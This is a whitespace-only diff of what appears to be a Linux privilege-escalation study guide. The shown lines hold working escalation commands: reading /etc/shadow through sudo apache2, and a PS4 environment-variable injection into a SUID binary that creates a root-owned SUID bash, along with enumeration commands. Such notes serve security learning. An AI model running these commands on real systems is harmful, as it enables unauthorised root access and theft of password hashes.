@@ -145,9 +145,9 @@ There are many scripts that you can execute on a linux machine which automatical
  
   Enumeration
    
-     sudo -l
-     sudo --version
-     sudo apache2 -f /etc/shadow
+    sudo -l
+    sudo --version
+    sudo apache2 -f /etc/shadow
                  
                  
 		 
@@ -187,7 +187,7 @@ void _init() {
 
 And Type Command 
    
-      sudo -l
+   sudo -l
    
 And Output 
 
@@ -266,7 +266,7 @@ OUTPUT
 
 Exploit Shared Object Injection
    
-      mkdir /home/user/.config
+    mkdir /home/user/.config
        
    Create C file Type Some Commands
        
@@ -314,8 +314,8 @@ Environment Variables
    ,,,
    Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of          /bin/bash:
  
-      env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
-      /tmp/rootbash -p
+    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+    /tmp/rootbash -p
      
     
 
@@ -444,7 +444,7 @@ Exploit
    
  Type Command
  
-     cat /etc/exports
+    cat /etc/exports
      
  OUTPUT 
  
